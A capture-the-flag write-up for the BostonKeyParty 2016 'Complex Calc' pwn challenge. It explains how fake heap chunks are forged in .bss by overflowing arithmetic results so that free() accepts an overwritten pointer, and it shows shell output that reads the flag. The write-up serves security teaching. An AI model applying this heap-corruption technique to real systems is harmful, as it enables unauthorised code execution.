
## BostonKeyParty CTF 2016 - Complex Calc (Pwn 6pt)
##### 04/03 - 06/03/2016 (48hr)
___
### Description: 
we've fixed a tiny bug!

simplecalc.bostonkey.party 5500
___
### Solution
This code is identical with the simple calc. However the previous exploit doesn't work. We get 
segmentation fault upon free(). If we look at free(), there's no check if argument is NULL:
```assembly
.text:00000000004156D0 free            proc near ; CODE XREF: _i18n_number_rewrite+1EAp
.text:00000000004156D0                           ; _i18n_number_rewrite_0+1EAp ...
.text:00000000004156D0          mov     rax, cs:__free_hook
.text:00000000004156D7          test    rax, rax
.text:00000000004156DA          jnz     loc_41579A
.text:00000000004156E0          nop     dword ptr [rax]
.text:00000000004156E3          nop     word ptr [rax+rax+00h]
.text:00000000004156E9          mov     rax, [rdi-8]
.text:00000000004156ED          lea     rsi, [rdi-10h]
```
This means that ptr_10 must be a valid address pointing to the beginning of an allocated chunk on 
the heap:
```assembly
	.text:0000000000401383 ptr_10          = qword ptr -10h
```
This would be trivial is ASLR was disabled, or if we could leak an address from the heap. However,
both scenarios are false so we need another trick.

In order to solve the problem we have to see exactly why free() crashes and how slab allocator
works. If we see an allocated chunk in heap, there are 8 bytes before it (called chunk header)
which stores some metadata about the allocated region:
```
offset:	-16                    -8
		+----------------------+--------------------------+
		| previous chunk size  | Chunk size % 8 + 3 FLAGS |
	  0 +----------------------+--------------------------+
ptr -->	|                                                 |
		|                    User Data                    |
		|                                                 |
		+--------------------------------------------------
```
The minimum possible chunk size is 8 bytes, so we use the 3 LSBits as flags. If the LSBit is 
clear, we can find the previous chunk by using ptr - 16 as the previous chunk size. Slab
allocator keeps a linked list with all free chunks. Upon free() we must insert (and possibly
coallesce) the chunk in the free list.

If we somehow forge a fake chunk, we can make slab allocator believing that it's a valid chunk,
so it won't crash on free(). Remember our goal is to don't crash, not to really free some memory.

The only memory region that we can control and we know its address is in .bss. These are the
global variables used to store arguemnts for calculations. Thus we have to create a fake
chunk there and overwrite ptr_10 with an address within there.

Let's see the memory layout:
```assembly
.bss:00000000006C4A80             public add_1_6C4A80
.bss:00000000006C4A80 00 00 00 00 add_1_6C4A80 dd 0 	; DATA XREF: adds+13o
.bss:00000000006C4A80                                	; adds+5Er ...
.bss:00000000006C4A84 00 00 00 00 add_2_6C4A84 dd 0  	; DATA XREF: adds+40o
.bss:00000000006C4A84                               	; adds+69r ...
.....
.bss:00000000006C4AB4                                	; subs+69r ...
.bss:00000000006C4AB8 00 00 00 00 _sub_ans_6C4AB8 dd 0  ; DATA XREF: subs+98w
.bss:00000000006C4AB8                                  	; subs+9Er ...
.bss:00000000006C4ABC 00 00 00 00 align 20h
```

This is how we can forge our fake chunk: 
```
0x06C4A80: add_1    --> any value
0x06C4A84: add_2 	--> any value	(ignored, because LSbit is set)
0x06C4A88: add_res 	--> 0x21		(16B long, and LSbit is set)
0x06C4A8C: align	--> 0x00 		(0 by default; it must be 0)

0x06C4A90: div_1 	--> any value 	(the actual allocated chunk)
0x06C4A94: div_2	--> any value
0x06C4A98: div_ans 	--> any value
0x06C4A9C: align	--> any value

0x06C4AA0: mul_1 	--> any value	(next chunk header)
0x06C4AA4: mul_2 	--> any value	(ignored, because LSbit is set)
0x06C4AA8: mul_ans 	--> 0x21		(16B long, and LSbit is set)
0x06C4AAC: align	--> 0x00 		(0 by default; it must be 0)

0x06C4AB0: sub_1 	--> any value 	(the actual allocated chunk)
0x06C4AB4: sub_2 	--> any value
0x06C4AB8: sub_sub	--> any value
0x06C4ABC: align	--> any value
```
Now, we can have 2 valid chunks at .bss, so free() won't complain, because the header pointers
will be valid. Thus all we have to do, is to overwrite ptr_10 with 0x06C4A90 (which supposed to
be the address of the 1st fake chunk). Because the size of the chunk (0x21, will be valid).

The last challenge is how to set add_res and mul_ans to 0x21. Because input numbers must be 
> 0x27, we have to use some very large numbers that will overflow and the result will be
very small. So:

```
add_1   = 0xffffff80 
add_2   = 0xa1
add_res = 0x100000021 = 0x21

mul_1   = 0x80000001
mul_2   = 0x80000021
mul_ans = 0x4000001100000021 = 0x21
```


Now we can write our exploit and get the flag **BKPCTF{th3 l4st 1 2 3z}**

```
root@nogirl:~/ctf/bostonkeyparty# ./complex_calc_expl.py 
	[..... TRUNCATED FOR BREVITY .....]
	Options Menu: 
	 [1] Addition.
	 [2] Subtraction.
	 [3] Multiplication.
	 [4] Division.
	 [5] Save and Exit.
	=> whoami
		nobody
	ls -la
		total 1188
		drwxr-xr-x 2 root root   4096 Mar  5 03:37 .
		drwxr-xr-x 3 root root   4096 Mar  5 03:20 ..
		-rw-r--r-- 1 root root    220 Mar  5 03:20 .bash_logout
		-rw-r--r-- 1 root root   3637 Mar  5 03:20 .bashrc
		-rw-r--r-- 1 root root    675 Mar  5 03:20 .profile
		-rw-r--r-- 1 root root     24 Mar  5 03:37 key
		-rwxr-xr-x 1 root root     83 Mar  5 03:26 run.sh
		-rwxr-xr-x 1 root root 882266 Mar  5 03:25 simpleCalc_v2
		-rw-r--r-- 1 root root 302348 Mar  5 03:20 socat_1.7.2.3-1_amd64.deb
	cat key
		BKPCTF{th3 l4st 1 2 3z}
	exit
	*** Connection closed by remote host ***
```

___
